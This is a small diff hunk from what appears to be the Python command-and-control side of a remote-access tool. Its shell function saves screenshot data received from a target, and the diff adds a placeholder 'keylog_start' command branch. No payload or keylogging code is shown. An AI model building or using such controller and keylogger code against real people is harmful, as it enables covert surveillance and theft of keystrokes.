@@ -69,6 +69,8 @@ def shell(_s, _target, _addr):
                     sc.write(png_data_decode)
                     count += 1
                 sc.close()
+        elif cmd[:12] == 'keylog_start':
+            continue
         else:
             result = reliable_recv(_target)
             print('------------------\n', result, '\n------------------\n')
